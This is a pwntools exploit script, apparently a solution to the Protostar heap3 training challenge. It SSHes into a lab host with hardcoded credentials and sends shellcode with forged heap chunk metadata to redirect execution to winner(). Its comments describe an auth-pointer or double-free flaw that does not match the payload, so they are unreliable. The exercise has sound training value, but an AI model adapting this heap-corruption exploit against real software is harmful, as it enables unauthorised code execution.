#!/usr/bin/python3
from pwn import *
sesh = ssh(user='user', host='192.168.1.191', password='user', port=22)
if sesh:
    sesh.set_working_directory(symlink=True)
else:
    log.info("Error connecting!")
# the programmer allows the user to free memory as many times as they want
# and the freed pointer isn't set to NULL
# the program checks for non-zero and since the pointer for auth isn't
# 0 the user is authenticated
io = sesh.run('bash', env={"PS1":""})
winner = p32(0x8048864)
# push 0x08048864 (winner's address)
# ret (ret will then go to winner since it is on the top of the stack)
#  http://shell-storm.org/online/Online-Assembler-and-Disassembler/
shellcode = b'\\x68\\x64\\x88\\x04\\x08\\xc3'
exploit = '/opt/protostar/bin/heap3 AAAA '
exploit += '$(python -c \'print "\\xff"*16+"\\x68\\x64\\x88\\x04\\x08\\xc3"+"\\xff"*10 + "\\xfc\\xff\\xff\\xff"*2\') '
exploit += '$(python -c \'print "\\xff"*4+"\\x1c\\xb1\\x04\\x08"+"@\\xc0\\x04\\x08"\')'
print(exploit)
io.sendline(exploit)
for i in range(1):
     log.info(io.recvline(timeout=2).decode('utf-8'))
sesh.close()
